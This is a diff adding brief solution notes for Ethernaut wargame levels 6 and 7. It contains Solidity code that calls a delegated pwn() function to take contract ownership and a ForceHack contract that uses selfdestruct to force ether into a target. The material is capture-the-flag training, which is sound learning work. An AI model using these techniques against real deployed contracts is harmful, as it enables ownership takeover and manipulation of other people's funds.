@@ -118,3 +118,35 @@ contract tokenHack {
 }
 ```
 
+## Level 06
+
+https://ethernaut.openzeppelin.com/level/6
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IDelegate {
+    function owner() external view returns (address);
+    function pwn() external;
+}
+```
+
+Add more extra gas
+
+## Level 07
+
+https://ethernaut.openzeppelin.com/level/7
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract ForceHack {
+    constructor(address payable _address) payable {
+        selfdestruct(_address);
+    }
+}
+```
+
+Add amount of ether to send
